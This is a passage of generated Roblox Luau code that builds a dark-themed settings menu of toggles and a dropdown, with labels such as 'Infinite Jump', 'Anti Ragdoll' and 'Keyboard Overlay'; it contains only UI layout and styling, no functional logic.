G.UIStroke_64 = Instance.new("UIStroke")
G.UIStroke_64.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_64.Parent = G.Frame_102

-- TextLabel_60 (TextLabel)
G.TextLabel_60 = Instance.new("TextLabel")
G.TextLabel_60.BackgroundTransparency = 1
G.TextLabel_60.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_60.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_60.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_60.Text = "Infinite Jump"
G.TextLabel_60.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_60.TextSize = 14
G.TextLabel_60.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_60.Parent = G.Frame_102

-- Frame_103 (Frame)
G.Frame_103 = Instance.new("Frame")
G.Frame_103.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_103.BorderSizePixel = 0
G.Frame_103.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_103.Size = UDim2.new(0, 46, 0, 24)
G.Frame_103.ZIndex = 3
G.Frame_103.Parent = G.Frame_102

-- UICorner_113 (UICorner)
G.UICorner_113 = Instance.new("UICorner")
G.UICorner_113.CornerRadius = UDim.new(1, 0)
G.UICorner_113.Parent = G.Frame_103

-- Frame_104 (Frame)
G.Frame_104 = Instance.new("Frame")
G.Frame_104.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_104.BorderSizePixel = 0
G.Frame_104.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_104.Size = UDim2.new(0, 18, 0, 18)
G.Frame_104.ZIndex = 4
G.Frame_104.Parent = G.Frame_103

-- UICorner_114 (UICorner)
G.UICorner_114 = Instance.new("UICorner")
G.UICorner_114.CornerRadius = UDim.new(1, 0)
G.UICorner_114.Parent = G.Frame_104

-- TextButton_27 (TextButton)
G.TextButton_27 = Instance.new("TextButton")
G.TextButton_27.BackgroundTransparency = 1
G.TextButton_27.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_27.ZIndex = 5
G.TextButton_27.AutoButtonColor = false
G.TextButton_27.Text = ""
G.TextButton_27:SetAttribute("PrintedSoundWired", true)
G.TextButton_27.Parent = G.Frame_103

-- Frame_105 (Frame)
G.Frame_105 = Instance.new("Frame")
G.Frame_105.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_105.BorderSizePixel = 0
G.Frame_105.ClipsDescendants = true
G.Frame_105.LayoutOrder = 41
G.Frame_105.Size = UDim2.new(1, 0, 0, 40)
G.Frame_105.Parent = G.Page4

-- UICorner_115 (UICorner)
G.UICorner_115 = Instance.new("UICorner")
G.UICorner_115.CornerRadius = UDim.new(0, 14)
G.UICorner_115.Parent = G.Frame_105

-- UIStroke_65 (UIStroke)
G.UIStroke_65 = Instance.new("UIStroke")
G.UIStroke_65.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_65.Parent = G.Frame_105

-- TextLabel_61 (TextLabel)
G.TextLabel_61 = Instance.new("TextLabel")
G.TextLabel_61.BackgroundTransparency = 1
G.TextLabel_61.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_61.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_61.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_61.Text = "Jump Mode"
G.TextLabel_61.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_61.TextSize = 14
G.TextLabel_61.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_61.Parent = G.Frame_105

-- DropChip_6 (TextButton)
G.DropChip_6 = Instance.new("TextButton")
G.DropChip_6.Name = "DropChip"
G.DropChip_6.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
G.DropChip_6.BorderSizePixel = 0
G.DropChip_6.Position = UDim2.new(1, -100, 0, 7)
G.DropChip_6.Size = UDim2.new(0, 90, 0, 26)
G.DropChip_6.ZIndex = 12
G.DropChip_6.AutoButtonColor = false
G.DropChip_6.Text = ""
G.DropChip_6:SetAttribute("PrintedSoundWired", true)
G.DropChip_6.Parent = G.Frame_105

-- UICorner_116 (UICorner)
G.UICorner_116 = Instance.new("UICorner")
G.UICorner_116.Parent = G.DropChip_6

-- UIStroke_66 (UIStroke)
G.UIStroke_66 = Instance.new("UIStroke")
G.UIStroke_66.Color = Color3.fromRGB(55, 60, 72)
G.UIStroke_66.Transparency = 0.40000000596046448
G.UIStroke_66.Parent = G.DropChip_6

-- TextLabel_62 (TextLabel)
G.TextLabel_62 = Instance.new("TextLabel")
G.TextLabel_62.BackgroundTransparency = 1
G.TextLabel_62.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_62.Size = UDim2.new(1, -22, 1, 0)
G.TextLabel_62.ZIndex = 13
G.TextLabel_62.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_62.Text = "Manual"
G.TextLabel_62.TextColor3 = Color3.fromRGB(200, 204, 216)
G.TextLabel_62.TextSize = 12
G.TextLabel_62.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_62.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_62.Parent = G.DropChip_6

-- TextLabel_63 (TextLabel)
G.TextLabel_63 = Instance.new("TextLabel")
G.TextLabel_63.BackgroundTransparency = 1
G.TextLabel_63.Position = UDim2.new(1, -18, 0, 0)
G.TextLabel_63.Size = UDim2.new(0, 18, 1, 0)
G.TextLabel_63.ZIndex = 13
G.TextLabel_63.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_63.Text = "v"
G.TextLabel_63.TextColor3 = Color3.fromRGB(150, 155, 168)
G.TextLabel_63.TextSize = 11
G.TextLabel_63.Parent = G.DropChip_6

-- Frame_106 (Frame)
G.Frame_106 = Instance.new("Frame")
G.Frame_106.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_106.BorderSizePixel = 0
G.Frame_106.ClipsDescendants = true
G.Frame_106.LayoutOrder = 42
G.Frame_106.Size = UDim2.new(1, 0, 0, 40)
G.Frame_106.Parent = G.Page4

-- UICorner_117 (UICorner)
G.UICorner_117 = Instance.new("UICorner")
G.UICorner_117.CornerRadius = UDim.new(0, 14)
G.UICorner_117.Parent = G.Frame_106

-- UIStroke_67 (UIStroke)
G.UIStroke_67 = Instance.new("UIStroke")
G.UIStroke_67.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_67.Parent = G.Frame_106

-- TextLabel_64 (TextLabel)
G.TextLabel_64 = Instance.new("TextLabel")
G.TextLabel_64.BackgroundTransparency = 1
G.TextLabel_64.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_64.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_64.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_64.Text = "Anti Ragdoll"
G.TextLabel_64.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_64.TextSize = 14
G.TextLabel_64.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_64.Parent = G.Frame_106

-- Frame_107 (Frame)
G.Frame_107 = Instance.new("Frame")
G.Frame_107.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_107.BorderSizePixel = 0
G.Frame_107.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_107.Size = UDim2.new(0, 46, 0, 24)
G.Frame_107.ZIndex = 3
G.Frame_107.Parent = G.Frame_106

-- UICorner_118 (UICorner)
G.UICorner_118 = Instance.new("UICorner")
G.UICorner_118.CornerRadius = UDim.new(1, 0)
G.UICorner_118.Parent = G.Frame_107

-- Frame_108 (Frame)
G.Frame_108 = Instance.new("Frame")
G.Frame_108.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_108.BorderSizePixel = 0
G.Frame_108.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_108.Size = UDim2.new(0, 18, 0, 18)
G.Frame_108.ZIndex = 4
G.Frame_108.Parent = G.Frame_107

-- UICorner_119 (UICorner)
G.UICorner_119 = Instance.new("UICorner")
G.UICorner_119.CornerRadius = UDim.new(1, 0)
G.UICorner_119.Parent = G.Frame_108

-- TextButton_28 (TextButton)
G.TextButton_28 = Instance.new("TextButton")
G.TextButton_28.BackgroundTransparency = 1
G.TextButton_28.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_28.ZIndex = 5
G.TextButton_28.AutoButtonColor = false
G.TextButton_28.Text = ""
G.TextButton_28:SetAttribute("PrintedSoundWired", true)
G.TextButton_28.Parent = G.Frame_107

-- Frame_109 (Frame)
G.Frame_109 = Instance.new("Frame")
G.Frame_109.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_109.BorderSizePixel = 0
G.Frame_109.ClipsDescendants = true
G.Frame_109.LayoutOrder = 43
G.Frame_109.Size = UDim2.new(1, 0, 0, 40)
G.Frame_109.Parent = G.Page4

-- UICorner_120 (UICorner)
G.UICorner_120 = Instance.new("UICorner")
G.UICorner_120.CornerRadius = UDim.new(0, 14)
G.UICorner_120.Parent = G.Frame_109

-- UIStroke_68 (UIStroke)
G.UIStroke_68 = Instance.new("UIStroke")
G.UIStroke_68.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_68.Parent = G.Frame_109

-- TextLabel_65 (TextLabel)
G.TextLabel_65 = Instance.new("TextLabel")
G.TextLabel_65.BackgroundTransparency = 1
G.TextLabel_65.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_65.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_65.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_65.Text = "Medusa Counter"
G.TextLabel_65.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_65.TextSize = 14
G.TextLabel_65.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_65.Parent = G.Frame_109

-- Frame_110 (Frame)
G.Frame_110 = Instance.new("Frame")
G.Frame_110.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_110.BorderSizePixel = 0
G.Frame_110.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_110.Size = UDim2.new(0, 46, 0, 24)
G.Frame_110.ZIndex = 3
G.Frame_110.Parent = G.Frame_109

-- UICorner_121 (UICorner)
G.UICorner_121 = Instance.new("UICorner")
G.UICorner_121.CornerRadius = UDim.new(1, 0)
G.UICorner_121.Parent = G.Frame_110

-- Frame_111 (Frame)
G.Frame_111 = Instance.new("Frame")
G.Frame_111.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_111.BorderSizePixel = 0
G.Frame_111.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_111.Size = UDim2.new(0, 18, 0, 18)
G.Frame_111.ZIndex = 4
G.Frame_111.Parent = G.Frame_110

-- UICorner_122 (UICorner)
G.UICorner_122 = Instance.new("UICorner")
G.UICorner_122.CornerRadius = UDim.new(1, 0)
G.UICorner_122.Parent = G.Frame_111

-- TextButton_29 (TextButton)
G.TextButton_29 = Instance.new("TextButton")
G.TextButton_29.BackgroundTransparency = 1
G.TextButton_29.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_29.ZIndex = 5
G.TextButton_29.AutoButtonColor = false
G.TextButton_29.Text = ""
G.TextButton_29:SetAttribute("PrintedSoundWired", true)
G.TextButton_29.Parent = G.Frame_110

-- Frame_112 (Frame)
G.Frame_112 = Instance.new("Frame")
G.Frame_112.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_112.BorderSizePixel = 0
G.Frame_112.ClipsDescendants = true
G.Frame_112.LayoutOrder = 44
G.Frame_112.Size = UDim2.new(1, 0, 0, 40)
G.Frame_112.Parent = G.Page4

-- UICorner_123 (UICorner)
G.UICorner_123 = Instance.new("UICorner")
G.UICorner_123.CornerRadius = UDim.new(0, 14)
G.UICorner_123.Parent = G.Frame_112

-- UIStroke_69 (UIStroke)
G.UIStroke_69 = Instance.new("UIStroke")
G.UIStroke_69.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_69.Parent = G.Frame_112

-- TextLabel_66 (TextLabel)
G.TextLabel_66 = Instance.new("TextLabel")
G.TextLabel_66.BackgroundTransparency = 1
G.TextLabel_66.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_66.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_66.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_66.Text = "Unwalk"
G.TextLabel_66.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_66.TextSize = 14
G.TextLabel_66.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_66.Parent = G.Frame_112

-- Frame_113 (Frame)
G.Frame_113 = Instance.new("Frame")
G.Frame_113.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_113.BorderSizePixel = 0
G.Frame_113.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_113.Size = UDim2.new(0, 46, 0, 24)
G.Frame_113.ZIndex = 3
G.Frame_113.Parent = G.Frame_112

-- UICorner_124 (UICorner)
G.UICorner_124 = Instance.new("UICorner")
G.UICorner_124.CornerRadius = UDim.new(1, 0)
G.UICorner_124.Parent = G.Frame_113

-- Frame_114 (Frame)
G.Frame_114 = Instance.new("Frame")
G.Frame_114.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_114.BorderSizePixel = 0
G.Frame_114.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_114.Size = UDim2.new(0, 18, 0, 18)
G.Frame_114.ZIndex = 4
G.Frame_114.Parent = G.Frame_113

-- UICorner_125 (UICorner)
G.UICorner_125 = Instance.new("UICorner")
G.UICorner_125.CornerRadius = UDim.new(1, 0)
G.UICorner_125.Parent = G.Frame_114

-- TextButton_30 (TextButton)
G.TextButton_30 = Instance.new("TextButton")
G.TextButton_30.BackgroundTransparency = 1
G.TextButton_30.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_30.ZIndex = 5
G.TextButton_30.AutoButtonColor = false
G.TextButton_30.Text = ""
G.TextButton_30:SetAttribute("PrintedSoundWired", true)
G.TextButton_30.Parent = G.Frame_113

-- Frame_115 (Frame)
G.Frame_115 = Instance.new("Frame")
G.Frame_115.BackgroundTransparency = 1
G.Frame_115.BorderSizePixel = 0
G.Frame_115.LayoutOrder = 64
G.Frame_115.Size = UDim2.new(1, 0, 0, 38)
G.Frame_115.Parent = G.Page4

-- TextLabel_67 (TextLabel)
G.TextLabel_67 = Instance.new("TextLabel")
G.TextLabel_67.BackgroundTransparency = 1
G.TextLabel_67.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_67.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_67.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_67.Text = "INTRO"
G.TextLabel_67.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_67.TextSize = 15
G.TextLabel_67.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_67.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_67.Parent = G.Frame_115

-- Frame_116 (Frame)
G.Frame_116 = Instance.new("Frame")
G.Frame_116.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_116.BackgroundTransparency = 0.34999999403953552
G.Frame_116.BorderSizePixel = 0
G.Frame_116.Position = UDim2.new(0, 8, 1, -4)
G.Frame_116.Size = UDim2.new(1, -16, 0, 2)
G.Frame_116.Parent = G.Frame_115

-- Frame_117 (Frame)
G.Frame_117 = Instance.new("Frame")
G.Frame_117.BackgroundTransparency = 1
G.Frame_117.BorderSizePixel = 0
G.Frame_117.LayoutOrder = 65
G.Frame_117.Size = UDim2.new(1, 0, 0, 38)
G.Frame_117.Parent = G.Page4

-- TextLabel_68 (TextLabel)
G.TextLabel_68 = Instance.new("TextLabel")
G.TextLabel_68.BackgroundTransparency = 1
G.TextLabel_68.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_68.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_68.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_68.Text = "INTERFACE"
G.TextLabel_68.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_68.TextSize = 15
G.TextLabel_68.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_68.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_68.Parent = G.Frame_117

-- Frame_118 (Frame)
G.Frame_118 = Instance.new("Frame")
G.Frame_118.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_118.BackgroundTransparency = 0.34999999403953552
G.Frame_118.BorderSizePixel = 0
G.Frame_118.Position = UDim2.new(0, 8, 1, -4)
G.Frame_118.Size = UDim2.new(1, -16, 0, 2)
G.Frame_118.Parent = G.Frame_117

-- Frame_119 (Frame)
G.Frame_119 = Instance.new("Frame")
G.Frame_119.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_119.BorderSizePixel = 0
G.Frame_119.ClipsDescendants = true
G.Frame_119.LayoutOrder = 66
G.Frame_119.Size = UDim2.new(1, 0, 0, 40)
G.Frame_119.Parent = G.Page4

-- UICorner_126 (UICorner)
G.UICorner_126 = Instance.new("UICorner")
G.UICorner_126.CornerRadius = UDim.new(0, 14)
G.UICorner_126.Parent = G.Frame_119

-- UIStroke_70 (UIStroke)
G.UIStroke_70 = Instance.new("UIStroke")
G.UIStroke_70.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_70.Parent = G.Frame_119

-- TextLabel_69 (TextLabel)
G.TextLabel_69 = Instance.new("TextLabel")
G.TextLabel_69.BackgroundTransparency = 1
G.TextLabel_69.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_69.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_69.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_69.Text = "Lock GUI"
G.TextLabel_69.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_69.TextSize = 14
G.TextLabel_69.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_69.Parent = G.Frame_119

-- Frame_120 (Frame)
G.Frame_120 = Instance.new("Frame")
G.Frame_120.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_120.BorderSizePixel = 0
G.Frame_120.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_120.Size = UDim2.new(0, 46, 0, 24)
G.Frame_120.ZIndex = 3
G.Frame_120.Parent = G.Frame_119

-- UICorner_127 (UICorner)
G.UICorner_127 = Instance.new("UICorner")
G.UICorner_127.CornerRadius = UDim.new(1, 0)
G.UICorner_127.Parent = G.Frame_120

-- Frame_121 (Frame)
G.Frame_121 = Instance.new("Frame")
G.Frame_121.BackgroundColor3 = Color3.new(0.53411763906478882, 0.77568626403808594, 1)
G.Frame_121.BorderSizePixel = 0
G.Frame_121.Position = UDim2.new(1, -21, 0.5, -9)
G.Frame_121.Size = UDim2.new(0, 18, 0, 18)
G.Frame_121.ZIndex = 4
G.Frame_121.Parent = G.Frame_120

-- UICorner_128 (UICorner)
G.UICorner_128 = Instance.new("UICorner")
G.UICorner_128.CornerRadius = UDim.new(1, 0)
G.UICorner_128.Parent = G.Frame_121

-- TextButton_31 (TextButton)
G.TextButton_31 = Instance.new("TextButton")
G.TextButton_31.BackgroundTransparency = 1
G.TextButton_31.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_31.ZIndex = 5
G.TextButton_31.AutoButtonColor = false
G.TextButton_31.Text = ""
G.TextButton_31:SetAttribute("PrintedSoundWired", true)
G.TextButton_31.Parent = G.Frame_120

-- AccentGrad_10 (UIGradient)
G.AccentGrad_10 = Instance.new("UIGradient")
G.AccentGrad_10.Name = "AccentGrad"
G.AccentGrad_10.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.AccentGrad_10.Rotation = 28
G.AccentGrad_10.Parent = G.Frame_120

-- Frame_122 (Frame)
G.Frame_122 = Instance.new("Frame")
G.Frame_122.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_122.BorderSizePixel = 0
G.Frame_122.ClipsDescendants = true
G.Frame_122.LayoutOrder = 67
G.Frame_122.Size = UDim2.new(1, 0, 0, 40)
G.Frame_122.Parent = G.Page4

-- UICorner_129 (UICorner)
G.UICorner_129 = Instance.new("UICorner")
G.UICorner_129.CornerRadius = UDim.new(0, 14)
G.UICorner_129.Parent = G.Frame_122

-- UIStroke_71 (UIStroke)
G.UIStroke_71 = Instance.new("UIStroke")
G.UIStroke_71.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_71.Parent = G.Frame_122

-- TextLabel_70 (TextLabel)
G.TextLabel_70 = Instance.new("TextLabel")
G.TextLabel_70.BackgroundTransparency = 1
G.TextLabel_70.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_70.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_70.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_70.Text = "Controller Overlay"
G.TextLabel_70.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_70.TextSize = 14
G.TextLabel_70.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_70.Parent = G.Frame_122

-- Frame_123 (Frame)
G.Frame_123 = Instance.new("Frame")
G.Frame_123.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_123.BorderSizePixel = 0
G.Frame_123.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_123.Size = UDim2.new(0, 46, 0, 24)
G.Frame_123.ZIndex = 3
G.Frame_123.Parent = G.Frame_122

-- UICorner_130 (UICorner)
G.UICorner_130 = Instance.new("UICorner")
G.UICorner_130.CornerRadius = UDim.new(1, 0)
G.UICorner_130.Parent = G.Frame_123

-- Frame_124 (Frame)
G.Frame_124 = Instance.new("Frame")
G.Frame_124.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_124.BorderSizePixel = 0
G.Frame_124.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_124.Size = UDim2.new(0, 18, 0, 18)
G.Frame_124.ZIndex = 4
G.Frame_124.Parent = G.Frame_123

-- UICorner_131 (UICorner)
G.UICorner_131 = Instance.new("UICorner")
G.UICorner_131.CornerRadius = UDim.new(1, 0)
G.UICorner_131.Parent = G.Frame_124

-- TextButton_32 (TextButton)
G.TextButton_32 = Instance.new("TextButton")
G.TextButton_32.BackgroundTransparency = 1
G.TextButton_32.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_32.ZIndex = 5
G.TextButton_32.AutoButtonColor = false
G.TextButton_32.Text = ""
G.TextButton_32:SetAttribute("PrintedSoundWired", true)
G.TextButton_32.Parent = G.Frame_123

-- Frame_125 (Frame)
G.Frame_125 = Instance.new("Frame")
G.Frame_125.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_125.BorderSizePixel = 0
G.Frame_125.ClipsDescendants = true
G.Frame_125.LayoutOrder = 68
G.Frame_125.Size = UDim2.new(1, 0, 0, 40)
G.Frame_125.Parent = G.Page4

-- UICorner_132 (UICorner)
G.UICorner_132 = Instance.new("UICorner")
G.UICorner_132.CornerRadius = UDim.new(0, 14)
G.UICorner_132.Parent = G.Frame_125

-- UIStroke_72 (UIStroke)
G.UIStroke_72 = Instance.new("UIStroke")
G.UIStroke_72.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_72.Parent = G.Frame_125

-- TextLabel_71 (TextLabel)
G.TextLabel_71 = Instance.new("TextLabel")
G.TextLabel_71.BackgroundTransparency = 1
G.TextLabel_71.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_71.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_71.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_71.Text = "Keyboard Overlay"
G.TextLabel_71.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_71.TextSize = 14
G.TextLabel_71.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_71.Parent = G.Frame_125

-- Frame_126 (Frame)
G.Frame_126 = Instance.new("Frame")
G.Frame_126.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_126.BorderSizePixel = 0
G.Frame_126.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_126.Size = UDim2.new(0, 46, 0, 24)
G.Frame_126.ZIndex = 3
G.Frame_126.Parent = G.Frame_125

-- UICorner_133 (UICorner)
G.UICorner_133 = Instance.new("UICorner")
G.UICorner_133.CornerRadius = UDim.new(1, 0)
G.UICorner_133.Parent = G.Frame_126

-- Frame_127 (Frame)
G.Frame_127 = Instance.new("Frame")
G.Frame_127.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_127.BorderSizePixel = 0
G.Frame_127.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_127.Size = UDim2.new(0, 18, 0, 18)
G.Frame_127.ZIndex = 4
G.Frame_127.Parent = G.Frame_126

-- UICorner_134 (UICorner)
G.UICorner_134 = Instance.new("UICorner")
G.UICorner_134.CornerRadius = UDim.new(1, 0)
G.UICorner_134.Parent = G.Frame_127

-- TextButton_33 (TextButton)
G.TextButton_33 = Instance.new("TextButton")
G.TextButton_33.BackgroundTransparency = 1
G.TextButton_33.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_33.ZIndex = 5
G.TextButton_33.AutoButtonColor = false
G.TextButton_33.Text = ""
G.TextButton_33:SetAttribute("PrintedSoundWired", true)
G.TextButton_33.Parent = G.Frame_126

-- Frame_128 (Frame)
G.Frame_128 = Instance.new("Frame")
G.Frame_128.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_128.BorderSizePixel = 0
G.Frame_128.ClipsDescendants = true
G.Frame_128.LayoutOrder = 69
G.Frame_128.Size = UDim2.new(1, 0, 0, 40)
G.Frame_128.Parent = G.Page4

-- UICorner_135 (UICorner)
G.UICorner_135 = Instance.new("UICorner")
G.UICorner_135.CornerRadius = UDim.new(0, 14)
G.UICorner_135.Parent = G.Frame_128

-- UIStroke_73 (UIStroke)
G.UIStroke_73 = Instance.new("UIStroke")
G.UIStroke_73.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_73.Parent = G.Frame_128

-- TextLabel_72 (TextLabel)
G.TextLabel_72 = Instance.new("TextLabel")
G.TextLabel_72.BackgroundTransparency = 1
G.TextLabel_72.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_72.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_72.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_72.Text = "Hide Mobile Buttons"
G.TextLabel_72.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_72.TextSize = 14
G.TextLabel_72.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_72.Parent = G.Frame_128

-- Frame_129 (Frame)
G.Frame_129 = Instance.new("Frame")
G.Frame_129.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_129.BorderSizePixel = 0
G.Frame_129.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_129.Size = UDim2.new(0, 46, 0, 24)
G.Frame_129.ZIndex = 3
G.Frame_129.Parent = G.Frame_128

-- UICorner_136 (UICorner)
G.UICorner_136 = Instance.new("UICorner")
G.UICorner_136.CornerRadius = UDim.new(1, 0)
G.UICorner_136.Parent = G.Frame_129

-- Frame_130 (Frame)
G.Frame_130 = Instance.new("Frame")
G.Frame_130.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_130.BorderSizePixel = 0
G.Frame_130.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_130.Size = UDim2.new(0, 18, 0, 18)
G.Frame_130.ZIndex = 4
G.Frame_130.Parent = G.Frame_129

-- UICorner_137 (UICorner)
G.UICorner_137 = Instance.new("UICorner")
G.UICorner_137.CornerRadius = UDim.new(1, 0)
G.UICorner_137.Parent = G.Frame_130

-- TextButton_34 (TextButton)
G.TextButton_34 = Instance.new("TextButton")
G.TextButton_34.BackgroundTransparency = 1
G.TextButton_34.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_34.ZIndex = 5
G.TextButton_34.AutoButtonColor = false
G.TextButton_34.Text = ""
G.TextButton_34:SetAttribute("PrintedSoundWired", true)
G.TextButton_34.Parent = G.Frame_129

-- Frame_131 (Frame)
G.Frame_131 = Instance.new("Frame")
G.Frame_131.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_131.BorderSizePixel = 0
G.Frame_131.ClipsDescendants = true
G.Frame_131.LayoutOrder = 70
G.Frame_131.Size = UDim2.new(1, 0, 0, 40)
G.Frame_131.Parent = G.Page4

-- UICorner_138 (UICorner)
